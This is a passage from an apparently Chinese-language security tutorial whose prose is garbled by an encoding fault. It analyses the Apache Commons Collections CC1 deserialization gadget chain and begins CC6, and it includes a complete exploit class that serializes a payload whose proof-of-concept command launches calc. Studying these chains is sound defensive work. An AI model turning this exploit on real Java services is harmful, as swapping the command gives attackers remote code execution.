lazyMapClass = LazyMap.class;<br>        <span class="hljs-comment">//é€šè¿‡åå°„æ‹¿åˆ°getæ–¹æ³•</span><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getmethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br><br>        getmethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        getmethod.invoke(decoratemp,runtime);<br>        <span class="hljs-comment">//ç„¶åæ³¨æ„è¿™é‡Œçš„ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªdecoratempï¼Œå…¶å®å°±æ˜¯åœ¨å®ƒä¸Šé¢è°ƒç”¨è¿™ä¸ªgetæ–¹æ³•ã€‚ç„¶åå¾—çŸ¥é“å‚æ•°å°±æ˜¯runtime()[å³transformçš„å‚æ•°æ˜¯runtime]</span><br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ChainedTransformeråŒ…è£…æˆLazyMapï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ©ç”¨getå»è§¦å‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lazy1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-comment">//create chain</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//LazyMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyM</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(hashMap, transformerChain);<br>        <span class="hljs-comment">//poc</span><br>        lazyM.get(<span class="hljs-string">&quot;foo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªgetçš„å€¼éšä¾¿å†™å°±è¡Œï¼Œå› ä¸ºè°ƒç”¨ LazyMap çš„ get æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥é”®å¯¹åº”çš„å€¼ä¸å­˜åœ¨ï¼ŒLazyMap ä¼šæ ¹æ®é”®å’Œ Transformer  é“¾ç”Ÿæˆä¸€ä¸ªæ–°çš„å€¼ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒLazyMap ä¼šä¾æ¬¡åº”ç”¨ Transformer é“¾ä¸­çš„æ¯ä¸€ä¸ª Transformer å¯¹è±¡ï¼Œå°†å‰ä¸€ä¸ª  Transformer çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ª Transformer çš„è¾“å…¥ï¼Œæœ€ç»ˆç”Ÿæˆå€¼ã€‚è™½ç„¶åé¢transform()é‡Œé¢è¦æ”¾ä¸ªå¯¹è±¡è¿›å»ï¼Œä¸è¿‡ç”±äºConstantTransformerçš„å­˜åœ¨æœ€ç»ˆè¿˜æ˜¯å˜æˆ<code>Runtime</code>ï¼Œåé¢å°±æ˜¯é‚£ä¸ªé“¾å¼ååº”ã€‚</p><p>è¿™è¿™ä¸œè¥¿æ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼š</p><p><img src="/img/image-20240316195339864.png" alt="image-20240316195339864"></p><p><code>AnnotationInvocationHandler.invoke()</code> æ–¹æ³•è°ƒç”¨äº† <code>get()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br></code></pre></td></tr></table></figure><p>å¯¹æŸä¸ªå¯¹è±¡ä½¿ç”¨Proxy.newProxyInstanceè¿›è¡ŒåŠ¨æ€ä»£ç†å¹¶ä¼ å…¥æœ‰å®ç°invokeçš„ç›¸åº”hanlderå¯¹è±¡ï¼ˆæ¯”å¦‚è¿™é‡Œçš„AnnotationInvocationHandlerï¼‰ï¼Œå½“è°ƒç”¨æ–¹æ³•æ—¶ï¼Œå°±ä¼šè·³è½¬åˆ°è¿™ä¸ªhandlerå¯¹è±¡çš„invokeæ–¹æ³•ã€‚æ¥ç€æˆ‘ä»¬å†æ¥çœ‹ä¸‹è¿™ä¸ªthis.memberValuesæ˜¯å¦å¯æ§å¹¶èƒ½å¦è®¾ç½®ä¸ºLazyMapï¼ŒæŸ¥çœ‹æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>memberValues</code>å¯æ§ã€‚å¯¹äº<code>invoke</code>è¿™ä¸ªæ–¹æ³•æ¥è¯´ï¼Œä¼šåœ¨ä»£ç†å¯¹è±¡çš„ä»»æ„æ–¹æ³•è¢«è°ƒç”¨æ—¶è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p><code>readobject</code>æ–¹æ³•ä¸­æ°å¥½å­˜åœ¨<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</code>ã€‚è°ƒç”¨äº†memberValuesçš„<code>entrySet()</code>æ–¹æ³•ï¼Œè§¦å‘è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ä¼šè‡ªåŠ¨èµ°åˆ°<code>memberValues</code>çš„invoke()æ–¹æ³•ã€‚</p><p>æŠŠä¸€ä¸ªAnnotationInvocationHandlerå¯¹è±¡ä½œä¸ºLazyMapåŠ¨æ€ä»£ç†çš„handler,æœ€åå†æŠŠä»£ç†åçš„LazyMapå†èµ‹å€¼ç»™ä¸€ä¸ªæ–°çš„Annâ€¦Handler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) ctor.newInstance(Retention.class, lazyM);<br>        <span class="hljs-comment">//set the handler for lazyM</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyLazyM</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyM.getClass().getClassLoader(), lazyM.getClass().getInterfaces(),handler);<br>        <span class="hljs-comment">//set the memberValues to proxyLazyM</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> ctor.newInstance(Retention.class, proxyLazyM);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨newinstanceå¼„äº†ä¸¤ä¸ª<code>AnnotationInvocationHandler</code>å¯¹è±¡ï¼Œå…¶å®ç¬¬ä¸€ä¸ªå°±æ˜¯æ‹¿æ¥å½“ä½œåŠ¨æ€ä»£ç†çš„<code>handler</code>çš„ã€‚ç¬¬äºŒä¸ªæ˜¯æ‹¿æ¥å½“ä»£ç†ä»¥è§¦å‘<code>readobject</code>ä¸­çš„<code>entrySet()</code>æ–¹æ³•ã€‚</p><p>æœ€ç»ˆEXP(å‚è€ƒäº†DBå¸ˆå‚…çš„æ–‡ç« ):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoChainsEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// æ­£ç‰ˆ CC1 é“¾æœ€ç»ˆ EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyFinalEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br>  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  <br> invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  <br>  <br> serialize(invocationHandler);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ³¨æ„invokeæ–¹æ³•çš„è¿™é‡Œï¼Œå¿…é¡»è¦è°ƒç”¨ä¸€ä¸ªæ— å‚æ–¹æ³•æ‰ä¼šèµ°åˆ°ä¸‹é¢çš„getï¼Œå¦åˆ™åœ¨ä¸­é€”ç›´æ¥returnäº†(è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯<code>memberValues.entrySet()</code>)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>    ObjectInputStream.readObject()<br>        AnnotationInvocationHandler.readObject()<br>            Map(Proxy).entrySet()<br>                AnnotationInvocationHandler.invoke()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>é“¾å­å°¾éƒ¨ä¸CC1ç›¸åŒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">LazyMap.get() -&gt;  factory.transform() -&gt; InvokeTransfromer.transfrom()<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè°è°ƒç”¨äº†è¿™ä¸ªgetï¼Ÿ</p><p><code>TiedMapEntry</code> ç±»ä¸­çš„ <code>getValue()</code> æ–¹æ³•è°ƒç”¨äº† <code>LazyMap</code> çš„ <code>get()</code> æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry.java</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>TiedMaEntry</code>ä¸­çš„<code>getvalue()</code>æ–¹æ³•è°ƒä¸ªè®¡ç®—å™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;) <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);  <br> <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);  <br> 